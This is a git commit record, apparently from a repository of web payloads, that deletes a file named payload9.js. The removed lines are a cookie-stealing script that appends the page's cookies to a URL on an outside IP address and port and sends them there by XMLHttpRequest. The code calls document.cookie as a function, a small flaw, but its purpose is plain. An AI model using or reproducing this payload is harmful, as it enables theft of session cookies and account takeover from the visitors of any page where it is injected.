5cfb68718e5fd5eb7075076eb6b399d813eeece4
Zaddish <40848785+Zaddish@users.noreply.github.com>
2022-10-27 06:03:40 +1100

    Delete payload9.js

--- payload9.js
+++
@@ -1,8 +0,0 @@
-const Http = new XMLHttpRequest();
-const url='http://172.104.196.216:37777/' + document.cookie();
-Http.open("GET", url);
-Http.send();
-
-Http.onreadystatechange = (e) => {
-  console.log(Http.responseText)
-}
